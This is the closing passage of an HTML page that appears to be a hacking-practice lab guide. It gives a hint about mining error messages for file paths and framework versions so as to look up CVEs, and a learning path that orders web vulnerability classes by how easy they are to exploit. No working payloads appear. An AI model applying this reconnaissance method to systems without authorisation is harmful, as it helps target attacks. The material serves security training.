                    <p>‚Ä¢ Look for: Error: ... at Function.module.exports (/app/src/...)</p>
                    <p>‚Ä¢ Leaked info: file paths, framework (Express.js, Koa), versions</p>
                    <p>‚Ä¢ Use leaked versions: search for CVEs in those specific versions</p>
                    <p>‚Ä¢ Impact: info disclosure enabling targeted attacks, source code paths</p>
                </div>
            </div>
        </div>
        
        <div class="warning-banner" style="margin-top: 80px;">
            <h2>üéì LEARNING PATH</h2>
            <p>Start with SQL Injection and IDOR - these are easier to exploit.</p>
            <p>Then progress to XSS, Command Injection, and SSTI.</p>
            <p>Advanced: XXE, SSRF, Race Conditions, and Business Logic Flaws.</p>
            <p><strong>Remember: Understanding > Exploitation</strong></p>
        </div>
        
        <div style="text-align: center; margin: 60px 0 40px; color: #0ff; font-size: 1.2rem;">
            <p>üíÄ Good luck, hacker. Trust no one. Verify everything. üíÄ</p>
        </div>
    </div>
    
    <script>
        function toggleExpand(btn) {
            const content = btn.nextElementSibling;
            if (content.classList.contains('active')) {
                content.classList.remove('active');
                btn.textContent = 'Show More Hints';
            } else {
                content.classList.add('active');
                btn.textContent = 'Show Less';
            }
        }
    </script>
</body>
</html>